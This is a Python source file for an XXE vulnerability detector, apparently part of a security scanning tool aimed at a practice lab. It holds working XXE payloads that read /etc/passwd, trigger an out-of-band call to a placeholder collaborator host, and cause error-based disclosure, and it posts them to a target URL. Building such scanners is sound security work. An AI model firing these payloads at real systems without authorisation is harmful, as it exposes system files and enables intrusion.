import aiohttp
from loguru import logger
from typing import Optional, Dict, Any
from bugtrace.core.ui import dashboard

class XXEDetector:
    """
    Dedicated engine for detecting XML External Entity (XXE) vulnerabilities.
    Focuses on OOB (Out-of-Band) and Error-based detection.
    """
    
    def __init__(self):
        self.payloads = [
            # Basic Local File Read (Linux)
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>',
            # OOB Detection (Needs a collaborator, but for now we look for DNS/HTTP interactions if possible)
            # In a real engagement, we'd use Interactsh.
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{COLLAB_HOST}"> %xxe; ]><stockCheck><productId>1</productId></stockCheck>',
            # Error-based XXE
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "file:///nonexistent/%ent;"> %remote;]><stockCheck><productId>1</productId></stockCheck>'
        ]

    async def check(self, url: str, base_xml: str, headers: Dict[str, str]) -> Optional[str]:
        """
        Attempts to inject XXE payloads into an XML request.
        """
        logger.info(f"Initiating XXE check on {url}...")
        
        async with aiohttp.ClientSession() as session:
            for payload in self.payloads:
                # For now, we use a simple replacement or use the payload directly if it matches the structure
                # Gin & Juice /catalog/product/stock expects specific XML
                try:
                    async with session.post(url, data=payload, headers=headers, timeout=10) as resp:
                        content = await resp.text()
                        
                        # Detection Logic: Look for /etc/passwd contents
                        if "root:x:0:0" in content:
                            return f"Vulnerable to XXE (File Read): {content[:100]}..."
                        
                        # Detection Logic: Look for specific XML parser errors
                        if "java.io.FileNotFoundException" in content or "failed to load external entity" in content.lower():
                            if "/etc/passwd" in content or "foo" in content:
                                return "Vulnerable to XXE (Error-based)"
                except Exception as e:
                    logger.debug(f"XXE payload failed: {e}")
                    
        return None

xxe_detector = XXEDetector()
